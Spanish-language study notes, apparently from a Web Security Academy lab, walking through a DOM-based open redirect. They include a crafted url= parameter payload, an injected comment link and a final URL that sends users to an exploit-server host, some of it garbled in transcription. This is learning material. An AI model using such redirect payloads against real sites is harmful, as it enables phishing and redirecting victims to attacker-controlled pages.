![[Pasted image 20220808201430.png]]

![[Pasted image 20220808201948.png]]

![[Pasted image 20220808202105.png]]

payload:
0aa900c10457e6abc02e647c000200bb.web-security-academy.net/post?postId=4&url=https://0aa900c10457e6abc02e647c000200bb.web-security-academy.net

Complementando para ejecutar el payload:

contenedor class="is-linkback"
                        a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "https://0aa900c10457e6abc02e647c000200bb.web-security-academy.net/post?postId=4&url=https://0aa900c10457e6abc02e647c000200bb.web-security-academy.net/"'>Back to Blog/a
contenedor


![[Pasted image 20220808203008.png]]

![[Pasted image 20220808203028.png]]

Intentando con el tutorial de BugBount Espana:  https://www.youtube.com/watch?v=s_tioSnldvU

Payload:
"<"a href='#' onclick='returnURL' = /url=https?:W.+)/.exec(location); if(returnUrl)location.href=returnUrl[1];else location.href = "/" ">Back to Blog"<"/a ">"

No necesito de la interaccion del lab con Burp Suite:

![[Pasted image 20230611061835.png]]

click en cualquier entrada del blog:

![[Pasted image 20230611061923.png]]

en el comment pego el payload:

![[Pasted image 20230611062202.png]]

luego post comment y hago click en el HTML que inyecte (back to blog):


![[Pasted image 20230611062328.png]]

entro al exploit server:

![[Pasted image 20230611062356.png]]

paralelamente en el url de la pagina principal agregare un parametro que s el url del exploit server sin ningun payload:

https://0a60007504e22b85803fbd0800ec0004.web-security-academy.net/post?postId=10

el del exploit server:
https://exploit-0a6b008104c62b8a8039bc7101640026.exploit-server.net/

uniendo:

https://0a60007504e22b85803fbd0800ec0004.web-security-academy.net/post?postId=10&url=https://exploit-0a6b008104c62b8a8039bc7101640026.exploit-server.net/

![[Pasted image 20230611062639.png]]